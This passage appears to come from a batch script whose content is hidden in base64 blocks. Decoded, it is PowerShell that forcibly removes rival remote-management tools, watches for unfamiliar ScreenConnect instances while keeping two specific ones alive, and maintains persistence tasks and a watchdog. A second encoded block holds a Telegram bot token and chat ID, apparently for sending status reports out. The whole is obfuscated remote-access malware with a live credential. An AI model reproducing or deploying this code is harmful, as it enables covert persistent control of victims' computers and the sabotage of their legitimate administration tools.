YW1GaWxlcyh4ODYpfVxHb3ZlcmxhbiIpOyBQcm9kPUAoJ0dvdmVybGFuKicpIH0KICAgICAgICBA
eyBUYWc9J1BEUSc7ICAgICAgICAgIFN2Yz1AKCdQRFEqJyk7IFByb2M9QCgnUERRUnVubmVyKics
J1BEUUludmVudG9yeSonLCdQRFFEZXBsb3kqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
QWRtaW4gQXJzZW5hbCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBZG1pbiBBcnNlbmFsIiwi
JGVudjpQcm9ncmFtRmlsZXNcUERRIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFBEUSIpOyBQ
cm9kPUAoJ1BEUSBEZXBsb3kqJywnUERRIEludmVudG9yeSonLCdQRFEgQ29ubmVjdConKSB9CiAg
ICApCgogICAgZm9yZWFjaCAoJHRvb2wgaW4gJHJtbSkgewogICAgICAgICRoaXQgPSAkZmFsc2UK
ICAgICAgICBmb3JlYWNoICgkcGF0IGluICR0b29sLlByb2QpIHsKICAgICAgICAgICAgZm9yZWFj
aCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgewogICAgICAgICAgICAgICAgR2V0
LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gt
T2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5Q
U1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lCiAgICAgICAg
ICAgICAgICAgICAgaWYgKCRkbiAtYW5kICRkbiAtbGlrZSAkcGF0KSB7CiAgICAgICAgICAgICAg
ICAgICAgICAgIGlmIChJcy1EYXR0b0tlZXBlciAkZG4pIHsgTG9nICJybW1fc2tpcF9kYXR0b19r
ZWVwIFskZG5dIjsgcmV0dXJuIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFVuaW5zdGFs
bC1Qcm9kdWN0S2V5ICRfKSB7ICRuLnJtbSsrOyAkaGl0ID0gJHRydWUgfQogICAgICAgICAgICAg
ICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAg
ICBmb3JlYWNoICgkcGF0IGluICR0b29sLlN2YykgewogICAgICAgICAgICBHZXQtU2VydmljZSAt
TmFtZSAkcGF0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qg
ewogICAgICAgICAgICAgICAgaWYgKElzLURhdHRvS2VlcGVyICRfLk5hbWUgLW9yIElzLURhdHRv
S2VlcGVyICRfLkRpc3BsYXlOYW1lKSB7IExvZyAicm1tX3NraXBfZGF0dG9fc3ZjICQoJF8uTmFt
ZSkiOyByZXR1cm4gfQogICAgICAgICAgICAgICAgJiBzYy5leGUgc3RvcCAiJCgkXy5OYW1lKSIg
Mj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRz
IDUwMAogICAgICAgICAgICAgICAgJiBzYy5leGUgZGVsZXRlICIkKCRfLk5hbWUpIiAyPiYxIHwg
T3V0LU51bGwKICAgICAgICAgICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1t
X3N2Y19kZWxldGVkICQoJF8uTmFtZSkgWyQoJHRvb2wuVGFnKV0iCiAgICAgICAgICAgIH0KICAg
ICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkdG9vbC5Qcm9jKSB7CiAgICAgICAgICAg
IEdldC1Qcm9jZXNzIC1OYW1lICRwYXQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBG
b3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLklkIC1G
b3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICAgICAgICAgJG4ucm1t
Kys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fcHJvY19raWxsZWQgJCgkXy5Qcm9jZXNzTmFtZSkg
WyQoJHRvb2wuVGFnKV0iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAo
JGQgaW4gJHRvb2wuRGlycykgewogICAgICAgICAgICBpZiAoJGQgLWFuZCAoVGVzdC1QYXRoIC1M
aXRlcmFsUGF0aCAkZCkpIHsKICAgICAgICAgICAgICAgIGlmIChJcy1EYXR0b0tlZXBlciAkZCkg
eyBMb2cgInJtbV9za2lwX2RhdHRvX2RpciAkZCI7IGNvbnRpbnVlIH0KICAgICAgICAgICAgICAg
IGlmIChGb3JjZS1SZW1vdmVEaXIgJGQpIHsgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJy
bW1fZGlyX3JlbW92ZWQgJGQiIH0KICAgICAgICAgICAgICAgIGVsc2UgeyAkbi5mYWlsKys7IExv
ZyAicm1tX2Rpcl9SRU1PVkVfRkFJTEVEICRkIiB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAg
ICAgICAgaWYgKCRoaXQpIHsgTG9nICJybW1fZXh0ZXJtaW5hdGVkICQoJHRvb2wuVGFnKSIgfQog
ICAgfQoKICAgICRzdW1tYXJ5ID0gImV4dGVybWluYXRlIHN2Yz0kKCRuLnN2YykgcHJvYz0kKCRu
LnByb2MpIGRpcj0kKCRuLmRpcikgcHJvZHVjdD0kKCRuLnByb2R1Y3QpIHJtbT0kKCRuLnJtbSkg
ZmFpbD0kKCRuLmZhaWwpIgogICAgTG9nICRzdW1tYXJ5CiAgICByZXR1cm4gJHN1bW1hcnkKfQoK
ZnVuY3Rpb24gVXBkYXRlLVN0YXRlIHsKICAgICRwcmltID0gJG51bGw7ICRhbHQgPSAkbnVsbAog
ICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xp
ZW50KicpKSB7CiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlc
KScpIHsKICAgICAgICAgICAgaWYgKCRtYXRjaGVzWzFdIC1lcSAnNWY2MDEwNTc5ODUyZTUwNycp
IHsgJHByaW0gPSAiJCgkc3ZjLlN0YXR1cykiIH0KICAgICAgICAgICAgZWxzZWlmICgkbWF0Y2hl
c1sxXSAtZXEgJ2Y4NjFjODE0MGQ0NTM0MjcnKSB7ICRhbHQgPSAiJCgkc3ZjLlN0YXR1cykiIH0K
ICAgICAgICB9CiAgICB9CiAgICAkZm9yZWlnbiA9IEAoKQogICAgZm9yZWFjaCAoJHN2YyBpbiAo
R2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicpKSB7CiAgICAgICAgaWYg
KCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScgLWFuZCAkbWF0Y2hlc1sxXSAt
bm90aW4gQCgnNWY2MDEwNTc5ODUyZTUwNycsJ2Y4NjFjODE0MGQ0NTM0MjcnKSkgewogICAgICAg
ICAgICAkZm9yZWlnbiArPSAkbWF0Y2hlc1sxXQogICAgICAgIH0KICAgIH0KICAgICRpZCA9IFJl
YWQtSWRlbnRpdHkKICAgICR0YXNrc09rID0gMDsgJHRhc2tzVG90YWwgPSAwCiAgICBmb3JlYWNo
ICgkayBpbiAnVEFTS19BJywnVEFTS19CJywnVEFTS19DJywnVEFTS19EJykgewogICAgICAgICR0
YXNrc1RvdGFsKysKICAgICAgICAkdG4gPSBOb3JtYWxpemUtVGFza05hbWUgKFtzdHJpbmddJGlk
WyRrXSkKICAgICAgICBpZiAoLW5vdCAkdG4pIHsgY29udGludWUgfQogICAgICAgICRtYXJrZXIg
PSBpZiAoJGsgLWVxICdUQVNLX0InKSB7ICdldGxfbW9uLmNtZCcgfSBlbHNlIHsgJ293bl9tb24u
Y21kJyB9CiAgICAgICAgaWYgKChUZXN0LVRhc2tPd25zTW9uICR0biAkbWFya2VyKSAtb3IgKFRl
c3QtVGFza093bnNNb24gKCJcJHRuIikgJG1hcmtlcikpIHsgJHRhc2tzT2srKyB9CiAgICB9CiAg
ICBpZiAoLW5vdCAkTW9uUGF0aCkgeyAkTW9uUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnb3du
X21vbi5jbWQnIH0KICAgICR3ZCA9IEVuc3VyZS1XYXRjaGRvZwogICAgJHByZXYgPSBAe30KICAg
ICRzdGF0ZVBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ3N0YXRlLmpzb24nCiAgICBpZiAoVGVz
dC1QYXRoICRzdGF0ZVBhdGgpIHsKICAgICAgICB0cnkgeyAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQ
YXRoICRzdGF0ZVBhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24pLlBTT2JqZWN0LlByb3BlcnRp
ZXMgfCBGb3JFYWNoLU9iamVjdCB7ICRwcmV2WyRfLk5hbWVdID0gJF8uVmFsdWUgfSB9IGNhdGNo
IHt9CiAgICB9CiAgICAkaW5zdGFsbENvdW50ID0gMQogICAgaWYgKCRwcmV2Lmluc3RhbGxDb3Vu
dCkgeyAkaW5zdGFsbENvdW50ID0gW2ludF0kcHJldi5pbnN0YWxsQ291bnQgfQogICAgaWYgKCRw
cmV2LnByaW0gLWFuZCAkcHJldi5wcmltIC1uZSAnUnVubmluZycgLWFuZCAkcHJpbSAtZXEgJ1J1
bm5pbmcnKSB7ICRpbnN0YWxsQ291bnQrKyB9CiAgICAkc3RhdGUgPSBbb3JkZXJlZF1AewogICAg
ICAgIGhvc3QgICAgICAgICA9ICRlbnY6Q09NUFVURVJOQU1FCiAgICAgICAgdHMgICAgICAgICAg
ID0gKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygnbycpCiAgICAgICAgYnVp
bGQgICAgICAgID0gJEJ1aWxkCiAgICAgICAgcHJpbSAgICAgICAgID0gJChpZiAoJHByaW0pIHsg
JHByaW0gfSBlbHNlIHsgJ01JU1NJTkcnIH0pCiAgICAgICAgYWx0ICAgICAgICAgID0gJChpZiAo
JGFsdCkgeyAkYWx0IH0gZWxzZSB7ICdNSVNTSU5HJyB9KQogICAgICAgIGZvcmVpZ24gICAgICA9
ICRmb3JlaWduCiAgICAgICAgdGFza3NPayAgICAgID0gJHRhc2tzT2sKICAgICAgICB0YXNrc1Rv
dGFsICAgPSAkdGFza3NUb3RhbAogICAgICAgIHdhdGNoZG9nICAgICA9ICR3ZAogICAgICAgIGlu
c3RhbGxDb3VudCA9ICRpbnN0YWxsQ291bnQKICAgICAgICBsYXN0SGVhbCAgICAgPSAkKGlmICgk
RXh0cmEpIHsgKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygnbycpIH0gZWxz
ZWlmICgkcHJldi5sYXN0SGVhbCkgeyAkcHJldi5sYXN0SGVhbCB9IGVsc2UgeyAkbnVsbCB9KQog
ICAgICAgIG5vdGUgICAgICAgICA9ICRFeHRyYQogICAgfQogICAgKCRzdGF0ZSB8IENvbnZlcnRU
by1Kc29uIC1Db21wcmVzcykgfCBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aCAt
Rm9yY2UKICAgIHJldHVybiAkc3RhdGUKfQoKc3dpdGNoICgkQWN0aW9uKSB7CiAgICAnaW5pdCcg
ICAgICAgICAgICB7ICRpZCA9IEluaXRpYWxpemUtSWRlbnRpdHk7ICRpZC5HZXRFbnVtZXJhdG9y
KCkgfCBGb3JFYWNoLU9iamVjdCB7ICIkKCRfLktleSk9JCgkXy5WYWx1ZSkiIH0gfQogICAgJ2lk
ZW50aXR5JyAgICAgICAgeyAkaWQgPSBSZWFkLUlkZW50aXR5OyAkaWQuR2V0RW51bWVyYXRvcigp
IHwgRm9yRWFjaC1PYmplY3QgeyAiJCgkXy5LZXkpPSQoJF8uVmFsdWUpIiB9IH0KICAgICd3YXRj
aGRvZycgICAgICAgIHsgSW5zdGFsbC1XYXRjaGRvZyB8IE91dC1OdWxsIH0KICAgICd3YXRjaGRv
Zy1lbnN1cmUnIHsgRW5zdXJlLVdhdGNoZG9nIH0KICAgICd0YXNrcy1lbnN1cmUnICAgIHsgRW5z
dXJlLVBlcnNpc3RUYXNrcyB9CiAgICAnc3RhdGUnICAgICAgICAgICB7IFVwZGF0ZS1TdGF0ZSB8
IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcyB9CiAgICAncmVwYWlyJyAgICAgICAgICB7IFJlcGFp
ci1TQ1NlcnZpY2UgJEZwIH0KICAgICdyZWdpc3RlcmVkJyAgICAgIHsgVGVzdC1TQ1JlZ2lzdGVy
ZWQgJEZwIH0KICAgICdleHRlcm1pbmF0ZScgICAgIHsgSW52b2tlLUV4dGVybWluYXRlIH0KfQo=
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcN
CkNIQVRfSUQ9NzU0NzQ2MjA3MA0K
::B64_NTF_END
